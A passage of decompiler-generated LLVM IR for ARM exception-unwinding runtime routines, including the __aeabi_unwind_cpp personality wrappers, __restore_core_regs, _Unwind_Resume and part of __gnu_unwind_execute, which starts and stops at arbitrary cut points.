  uselistorder i32 80, { 10, 11, 12, 0, 2, 1, 3, 4, 5, 8, 6, 7, 9 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_188f8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_18814, { 1, 0 }
  uselistorder label %dec_label_pc_187dc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_187a0, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_1871c, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_1865c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_18658, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_185b8, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_18514, { 1, 0 }
  uselistorder label %dec_label_pc_18514.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_18514.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_189b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_189b4:
  %v0_189b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_189b4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_189b4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_189b4, %bb
  %v10_189bc = phi i32 [ %arg1, %dec_label_pc_189b4 ], [ 0, %bb ]
  ret i32 %v10_189bc

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 28, 29, 30, 45, 23, 27, 46, 47, 48, 49, 50, 5, 4, 51, 42, 43, 31, 32, 24, 35, 34, 33, 36, 6, 8, 7, 20, 44, 25, 26, 12, 39, 19, 21, 22, 11, 10, 9, 13, 14, 15, 37, 16, 17, 18, 41, 38, 40, 52, 53 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189c4 = load i32, i32* @r1, align 4
  %v2_189c4 = load i32, i32* @r2, align 4
  %v4_189c4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_189c4, i32 %v2_189c4, i32 2)
  ret i32 %v4_189c4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189cc = load i32, i32* @r1, align 4
  %v2_189cc = load i32, i32* @r2, align 4
  %v4_189cc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_189cc, i32 %v2_189cc, i32 1)
  ret i32 %v4_189cc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189d4 = load i32, i32* @r1, align 4
  %v2_189d4 = load i32, i32* @r2, align 4
  %v4_189d4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_189d4, i32 %v2_189d4, i32 0)
  ret i32 %v4_189d4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 11, 10, 12, 59, 13, 0, 22, 14, 23, 60, 61, 62, 18, 19, 20, 21, 41, 42, 43, 44, 63, 64, 65, 79, 80, 81, 82, 1, 68, 69, 2, 70, 71, 3, 72, 66, 67, 35, 36, 4, 5, 6, 57, 58, 7, 8, 45, 46, 47, 73, 74, 75, 76, 77, 78, 37, 38, 39, 48, 49, 50, 52, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 40, 9, 51, 53, 54, 55, 56 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_189dc = add i32 %tmp, 56
  %v4_189dc = inttoptr i32 %v3_189dc to i32*
  %v5_189dc = load i32, i32* %v4_189dc, align 4
  %v6_189dc = add i32 %tmp, 60
  %v7_189dc = inttoptr i32 %v6_189dc to i32*
  %v8_189dc = load i32, i32* %v7_189dc, align 4
  %v2_189e8 = load i32, i32* %arg1, align 4
  %v3_189e8 = add i32 %tmp, 4
  %v4_189e8 = inttoptr i32 %v3_189e8 to i32*
  %v5_189e8 = load i32, i32* %v4_189e8, align 4
  store i32 %v5_189e8, i32* @r1, align 4
  %v12_189e8 = add i32 %tmp, 16
  %v13_189e8 = inttoptr i32 %v12_189e8 to i32*
  %v14_189e8 = load i32, i32* %v13_189e8, align 4
  store i32 %v14_189e8, i32* @r4, align 4
  %v15_189e8 = add i32 %tmp, 20
  %v16_189e8 = inttoptr i32 %v15_189e8 to i32*
  %v17_189e8 = load i32, i32* %v16_189e8, align 4
  store i32 %v17_189e8, i32* @r5, align 4
  %v18_189e8 = add i32 %tmp, 24
  %v19_189e8 = inttoptr i32 %v18_189e8 to i32*
  %v20_189e8 = load i32, i32* %v19_189e8, align 4
  store i32 %v20_189e8, i32* @r6, align 4
  %v21_189e8 = add i32 %tmp, 28
  %v22_189e8 = inttoptr i32 %v21_189e8 to i32*
  %v23_189e8 = load i32, i32* %v22_189e8, align 4
  store i32 %v23_189e8, i32* @r7, align 4
  %v24_189e8 = add i32 %tmp, 32
  %v25_189e8 = inttoptr i32 %v24_189e8 to i32*
  %v26_189e8 = load i32, i32* %v25_189e8, align 4
  store i32 %v26_189e8, i32* @r8, align 4
  %v27_189e8 = add i32 %tmp, 36
  %v28_189e8 = inttoptr i32 %v27_189e8 to i32*
  %v29_189e8 = load i32, i32* %v28_189e8, align 4
  store i32 %v29_189e8, i32* @sb, align 4
  %v30_189e8 = add i32 %tmp, 40
  %v31_189e8 = inttoptr i32 %v30_189e8 to i32*
  %v32_189e8 = load i32, i32* %v31_189e8, align 4
  store i32 %v32_189e8, i32* @sl, align 4
  store i32 %v8_189dc, i32* @ip, align 4
  store i32 %v5_189dc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_189dc)
  ret i32 %v2_189e8

; uselistorder directives
  uselistorder i32 %v8_189dc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 43, 44, 45, 46, 13, 14, 5, 0, 49, 6, 7, 47, 48, 11, 12, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 1, 83, 84, 85, 86, 87, 88, 89, 90, 91, 8, 92, 93, 35, 36, 2, 37, 38, 39, 40, 41, 42, 33, 9, 17, 34, 20, 10, 15, 16, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 3, 18, 19, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 119, 120, 121, 11, 12, 13, 14, 101, 102, 103, 104, 105, 106, 107, 108, 109, 112, 110, 111, 113, 93, 94, 76, 77, 1, 15, 16, 17, 18, 19, 20, 21, 22, 8, 5, 2, 3, 4, 6, 7, 9, 10, 24, 23, 29, 30, 25, 26, 27, 28, 31, 34, 32, 33, 0, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 95, 96, 97, 98, 99, 100, 114, 115, 116, 117, 118 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 261, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 1, 260, 0, 31, 262, 10, 263, 32, 33, 34, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 28, 29, 30, 36, 37, 38, 39, 11, 264, 15, 16, 4, 17, 196, 197, 5, 198, 199, 200, 224, 225, 226, 227, 228, 9, 229, 230, 231, 232, 233, 234, 235, 236, 183, 184, 185, 186, 168, 169, 170, 171, 172, 147, 148, 149, 150, 40, 41, 42, 43, 12, 84, 85, 86, 87, 88, 44, 45, 46, 47, 89, 90, 91, 92, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 14, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 6, 81, 82, 83, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 7, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 173, 174, 175, 176, 177, 178, 8, 179, 180, 181, 182, 187, 188, 2, 189, 190, 191, 192, 193, 194, 195, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 237, 238, 239, 240, 241, 242 }
  uselistorder i32 32, { 85, 82, 83, 84, 49, 86, 87, 45, 56, 88, 44, 79, 50, 46, 64, 62, 63, 59, 60, 61, 71, 72, 65, 66, 58, 69, 70, 51, 77, 78, 80, 2, 3, 5, 4, 81, 7, 6, 9, 8, 11, 10, 47, 52, 48, 73, 13, 12, 15, 14, 17, 16, 19, 18, 57, 21, 20, 22, 24, 23, 26, 25, 27, 28, 30, 29, 67, 68, 53, 74, 31, 75, 32, 76, 33, 34, 35, 36, 54, 37, 38, 39, 55, 40, 0, 41, 1, 42, 43 }
  uselistorder i32 28, { 50, 10, 33, 51, 30, 52, 53, 54, 55, 7, 34, 35, 31, 32, 39, 11, 36, 12, 47, 48, 49, 8, 13, 17, 21, 0, 19, 14, 20, 15, 22, 16, 23, 1, 24, 2, 25, 3, 26, 4, 27, 5, 28, 6, 29, 9, 18, 38, 37, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 24, { 98, 97, 99, 8, 9, 100, 0, 57, 58, 59, 60, 61, 62, 55, 56, 10, 63, 64, 74, 75, 65, 66, 7, 11, 96, 91, 92, 93, 1, 76, 77, 78, 37, 38, 12, 67, 68, 69, 52, 47, 39, 40, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 53, 54, 70, 71, 72, 73, 13, 79, 14, 80, 15, 81, 16, 17, 18, 19, 20, 82, 21, 22, 2, 23, 24, 25, 3, 26, 27, 4, 28, 29, 83, 30, 5, 84, 31, 85, 86, 87, 88, 32, 33, 6, 89, 34, 90, 35, 94, 36, 95 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 9, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 10, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 11, 114, 115, 116, 3, 51, 12, 52, 53, 0, 30, 43, 6, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 7, 105, 27, 106, 107, 108, 109, 8, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 174, 17, 16, 18, 4, 175, 176, 65, 66, 82, 45, 2, 178, 46, 177, 157, 47, 48, 49, 19, 67, 1, 68, 69, 20, 181, 21, 5, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 6, 199, 200, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 22, 164, 109, 110, 201, 23, 203, 204, 205, 206, 121, 122, 29, 84, 30, 202, 24, 31, 32, 33, 165, 166, 167, 168, 169, 170, 171, 172, 173, 44, 101, 102, 159, 7, 155, 156, 8, 160, 163, 161, 9, 162, 85, 86, 25, 147, 87, 148, 158, 123, 124, 12, 34, 35, 36, 37, 38, 39, 40, 10, 209, 210, 211, 212, 0, 213, 26, 83, 111, 143, 207, 208, 179, 180, 27, 13, 88, 112, 113, 114, 115, 116, 28, 125, 126, 89, 90, 41, 42, 43, 91, 92, 93, 95, 96, 94, 127, 97, 98, 99, 100, 103, 104, 105, 14, 106, 107, 108, 117, 118, 119, 15, 120, 151, 152, 11, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 145, 146, 149, 150, 153, 154 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 28, 29, 25, 26, 4, 5, 1, 6, 0, 7, 27, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_189f8 = load i32, i32* @r0, align 4
  ret i32 %v1_189f8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18a00 = load i32, i32* @r0, align 4
  ret i32 %v1_18a00
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a14 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a18 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18a14, i32 0)
  ret i32 %v2_18a18

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a38 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a3c = call i32 @__gnu_Unwind_Resume(i32 %v2_18a38, i32 0)
  ret i32 %v2_18a3c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a5c = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a60 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_18a5c, i32 0)
  ret i32 %v2_18a60

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a80 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18a84 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18a80, i32 %arg2, i8* %arg3, i32 %v2_18a80)
  ret i32 %v6_18a84

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18ab0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18ab8 = add i32 %tmp1, 76
  %v2_18ab8 = inttoptr i32 %v1_18ab8 to i32*
  %v3_18ab8 = load i32, i32* %v2_18ab8, align 4
  %v1_18abc = add i32 %v3_18ab8, 7
  %v2_18abc = inttoptr i32 %v1_18abc to i8*
  %v3_18abc = load i8, i8* %v2_18abc, align 1
  %v4_18abc = zext i8 %v3_18abc to i32
  %v1_18ac0 = add i32 %v3_18ab8, 8
  %v3_18ac4 = mul nuw nsw i32 %v4_18abc, 4
  %v2_18ac8 = add i32 %v3_18ac4, %v1_18ac0
  %v3_18ac8 = inttoptr i32 %v2_18ac8 to i8*
  ret i8* %v3_18ac8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18ad8 = load i32, i32* @r6, align 4
  %v21_18ad8 = load i32, i32* @lr, align 4
  %v0_18adc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18adc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_18aec

dec_label_pc_18aec:                               ; preds = %dec_label_pc_18aec.backedge, %entry
  %v3_18af8 = phi i32 [ %v0_18aec.pre, %dec_label_pc_18aec.backedge ], [ %tmp, %entry ]
  %v1_18aec = add i32 %v3_18af8, 8
  %v2_18aec = inttoptr i32 %v1_18aec to i8*
  %v3_18aec = load i8, i8* %v2_18aec, align 1
  %v4_18aec = zext i8 %v3_18aec to i32
  store i32 %v4_18aec, i32* %r3.global-to-local, align 4
  %v2_18af0 = icmp eq i8 %v3_18aec, 0
  store i1 %v2_18af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18af0, label %dec_label_pc_18b00, label %.thread

.thread:                                          ; preds = %dec_label_pc_18aec
  %v2_18af4 = add nsw i32 %v4_18aec, -1
  store i32 %v2_18af4, i32* %r3.global-to-local, align 4
  %v2_18af8 = trunc i32 %v2_18af4 to i8
  store i8 %v2_18af8, i8* %v2_18aec, align 1
  %v0_18afc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18afc.pr.pr, label %.thread.dec_label_pc_18b00_crit_edge, label %dec_label_pc_18b28

.thread.dec_label_pc_18b00_crit_edge:             ; preds = %.thread
  %v0_18b00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b00

dec_label_pc_18b00:                               ; preds = %.thread.dec_label_pc_18b00_crit_edge, %dec_label_pc_18aec
  %v0_18b00 = phi i32 [ %v0_18b00.pre, %.thread.dec_label_pc_18b00_crit_edge ], [ %v3_18af8, %dec_label_pc_18aec ]
  %v1_18b00 = add i32 %v0_18b00, 9
  %v2_18b00 = inttoptr i32 %v1_18b00 to i8*
  %v3_18b00 = load i8, i8* %v2_18b00, align 1
  %v4_18b00 = zext i8 %v3_18b00 to i32
  store i32 %v4_18b00, i32* %r3.global-to-local, align 4
  %v2_18b04 = icmp eq i8 %v3_18b00, 0
  store i1 %v2_18b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b04, label %dec_label_pc_18c08, label %dec_label_pc_18b0c

dec_label_pc_18b0c:                               ; preds = %dec_label_pc_18bfc, %dec_label_pc_18b00
  %v2_18b10 = phi i32 [ %v0_18bfc, %dec_label_pc_18bfc ], [ %v0_18b00, %dec_label_pc_18b00 ]
  %v0_18b0c = phi i32 [ %v4_18bfc, %dec_label_pc_18bfc ], [ %v4_18b00, %dec_label_pc_18b00 ]
  %v1_18b0c = add nsw i32 %v0_18b0c, -1
  store i32 %v1_18b0c, i32* %r3.global-to-local, align 4
  %v1_18b10 = trunc i32 %v1_18b0c to i8
  %v3_18b10 = add i32 %v2_18b10, 9
  %v4_18b10 = inttoptr i32 %v3_18b10 to i8*
  store i8 %v1_18b10, i8* %v4_18b10, align 1
  %v0_18b14 = load i32, i32* @r5, align 4
  %v1_18b14 = add i32 %v0_18b14, 4
  %v2_18b14 = inttoptr i32 %v1_18b14 to i32*
  %v3_18b14 = load i32, i32* %v2_18b14, align 4
  store i32 %v3_18b14, i32* %r2.global-to-local, align 4
  %v1_18b18 = inttoptr i32 %v3_18b14 to i32*
  %v2_18b18 = load i32, i32* %v1_18b18, align 4
  store i32 %v2_18b18, i32* %r0.global-to-local, align 4
  %v4_18b18 = add i32 %v3_18b14, 4
  store i32 %v4_18b18, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18b20 = inttoptr i32 %v0_18b14 to i32*
  store i32 %v2_18b18, i32* %v1_18b20, align 4
  %v5_18b20 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18b20, i32* %v2_18b14, align 4
  %v0_18b24 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b24 = trunc i32 %v0_18b24 to i8
  %v2_18b24 = load i32, i32* @r5, align 4
  %v3_18b24 = add i32 %v2_18b24, 8
  %v4_18b24 = inttoptr i32 %v3_18b24 to i8*
  store i8 %v1_18b24, i8* %v4_18b24, align 1
  br label %dec_label_pc_18b28

dec_label_pc_18b28:                               ; preds = %.thread, %dec_label_pc_18b0c, %.thread6
  %v0_18b28 = load i32, i32* @r5, align 4
  %v1_18b28 = inttoptr i32 %v0_18b28 to i32*
  %v2_18b28 = load i32, i32* %v1_18b28, align 4
  %v3_18b2c = udiv i32 %v2_18b28, 16777216
  store i32 %v3_18b2c, i32* @r4, align 4
  store i32 %v3_18b2c, i32* %ip.global-to-local, align 4
  %v3_18b34 = mul i32 %v2_18b28, 256
  store i32 %v3_18b34, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18b28, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18b34, i32* %v1_18b28, align 4
  br i1 %tmp183, label %dec_label_pc_18c08, label %dec_label_pc_18b44

dec_label_pc_18b44:                               ; preds = %dec_label_pc_18b28
  %v0_18b44 = load i32, i32* @r4, align 4
  %v1_18b44 = and i32 %v0_18b44, 128
  store i32 %v1_18b44, i32* %r1.global-to-local, align 4
  %v2_18b44 = icmp eq i32 %v1_18b44, 0
  store i1 %v2_18b44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b44, label %dec_label_pc_18c20, label %dec_label_pc_18b4c

dec_label_pc_18b4c:                               ; preds = %dec_label_pc_18b44
  %v1_18b4c = and i32 %v0_18b44, 240
  store i32 %v1_18b4c, i32* @r6, align 4
  %v7_18b50 = icmp eq i32 %v1_18b4c, 128
  store i1 %v7_18b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b50, label %dec_label_pc_18b58, label %dec_label_pc_18c7c

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b4c
  %v0_18b58 = load i32, i32* @r5, align 4
  %v1_18b58 = add i32 %v0_18b58, 8
  %v2_18b58 = inttoptr i32 %v1_18b58 to i8*
  %v3_18b58 = load i8, i8* %v2_18b58, align 1
  %v4_18b58 = zext i8 %v3_18b58 to i32
  store i32 %v4_18b58, i32* %r3.global-to-local, align 4
  %v2_18b5c = icmp eq i8 %v3_18b58, 0
  store i1 %v2_18b5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b5c, label %dec_label_pc_18b6c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18b58
  %v2_18b60 = add nsw i32 %v4_18b58, -1
  store i32 %v2_18b60, i32* %r3.global-to-local, align 4
  %v2_18b64 = trunc i32 %v2_18b60 to i8
  store i8 %v2_18b64, i8* %v2_18b58, align 1
  %v0_18b68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b68.pr.pr, label %.thread3.dec_label_pc_18b6c_crit_edge, label %dec_label_pc_18b9c

.thread3.dec_label_pc_18b6c_crit_edge:            ; preds = %.thread3
  %v0_18b6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b6c

dec_label_pc_18b6c:                               ; preds = %.thread3.dec_label_pc_18b6c_crit_edge, %dec_label_pc_18b58
  %v2_18b80 = phi i32 [ %v0_18b6c.pre, %.thread3.dec_label_pc_18b6c_crit_edge ], [ %v0_18b58, %dec_label_pc_18b58 ]
  %v1_18b6c = add i32 %v2_18b80, 9
  %v2_18b6c = inttoptr i32 %v1_18b6c to i8*
  %v3_18b6c = load i8, i8* %v2_18b6c, align 1
  %v4_18b6c = zext i8 %v3_18b6c to i32
  store i32 %v4_18b6c, i32* %r3.global-to-local, align 4
  %v2_18b70 = icmp eq i8 %v3_18b6c, 0
  store i1 %v2_18b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b70, label %dec_label_pc_18bac, label %dec_label_pc_18b7c

dec_label_pc_18b7c:                               ; preds = %dec_label_pc_18b6c
  %v1_18b7c = add nsw i32 %v4_18b6c, -1
  store i32 %v1_18b7c, i32* %r3.global-to-local, align 4
  %v1_18b80 = trunc i32 %v1_18b7c to i8
  store i8 %v1_18b80, i8* %v2_18b6c, align 1
  %v0_18b84 = load i32, i32* @r5, align 4
  %v1_18b84 = add i32 %v0_18b84, 4
  %v2_18b84 = inttoptr i32 %v1_18b84 to i32*
  %v3_18b84 = load i32, i32* %v2_18b84, align 4
  store i32 %v3_18b84, i32* %r2.global-to-local, align 4
  %v1_18b88 = inttoptr i32 %v3_18b84 to i32*
  %v2_18b88 = load i32, i32* %v1_18b88, align 4
  store i32 %v2_18b88, i32* %r0.global-to-local, align 4
  %v4_18b88 = add i32 %v3_18b84, 4
  store i32 %v4_18b88, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18b88, i32* %v2_18b84, align 4
  %v0_18b94 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b94 = trunc i32 %v0_18b94 to i8
  %v2_18b94 = load i32, i32* @r5, align 4
  %v3_18b94 = add i32 %v2_18b94, 8
  %v4_18b94 = inttoptr i32 %v3_18b94 to i8*
  store i8 %v1_18b94, i8* %v4_18b94, align 1
  %v0_18b98 = load i32, i32* %r0.global-to-local, align 4
  %v1_18b98 = load i32, i32* @r5, align 4
  %v2_18b98 = inttoptr i32 %v1_18b98 to i32*
  store i32 %v0_18b98, i32* %v2_18b98, align 4
  br label %dec_label_pc_18b9c

dec_label_pc_18b9c:                               ; preds = %.thread3, %dec_label_pc_18b7c
  %v0_18b9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18b9c, i32* %r3.global-to-local, align 4
  %v3_18ba0 = mul i32 %v0_18b9c, 256
  store i32 %v3_18ba0, i32* %r0.global-to-local, align 4
  %v1_18ba4 = load i32, i32* @r5, align 4
  %v2_18ba4 = inttoptr i32 %v1_18ba4 to i32*
  store i32 %v3_18ba0, i32* %v2_18ba4, align 4
  %v0_18ba8 = load i32, i32* %r3.global-to-local, align 4
  %v3_18ba8 = udiv i32 %v0_18ba8, 16777216
  br label %dec_label_pc_18bac

dec_label_pc_18bac:                               ; preds = %dec_label_pc_18b6c, %dec_label_pc_18b9c
  %storemerge133 = phi i32 [ %v3_18ba8, %dec_label_pc_18b9c ], [ 176, %dec_label_pc_18b6c ]
  %v1_18bac = load i32, i32* %ip.global-to-local, align 4
  %v4_18bac = mul i32 %v1_18bac, 256
  %v5_18bac = or i32 %v4_18bac, %storemerge133
  store i32 %v5_18bac, i32* %r2.global-to-local, align 4
  %v7_18bb0 = icmp eq i32 %v5_18bac, 32768
  store i1 %v7_18bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18bb0, label %dec_label_pc_18dbc, label %dec_label_pc_18bb8

dec_label_pc_18bb8:                               ; preds = %dec_label_pc_18bac
  %v3_18bb8 = mul i32 %v5_18bac, 16
  store i32 %v3_18bb8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18bc8 = and i32 %v3_18bb8, 65520
  store i32 %v3_18bc8, i32* %r2.global-to-local, align 4
  %v0_18bcc = load i32, i32* @r7, align 4
  store i32 %v0_18bcc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18bd4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18bcc, i32 %v3_18bc8, i32 0, i32 0)
  store i32 %v4_18bd4, i32* %r0.global-to-local, align 4
  %v2_18bd8 = icmp eq i32 %v4_18bd4, 0
  store i1 %v2_18bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bd8, label %dec_label_pc_18be0, label %dec_label_pc_18dbc

dec_label_pc_18be0:                               ; preds = %dec_label_pc_18bb8
  %v0_18be0 = load i32, i32* @r5, align 4
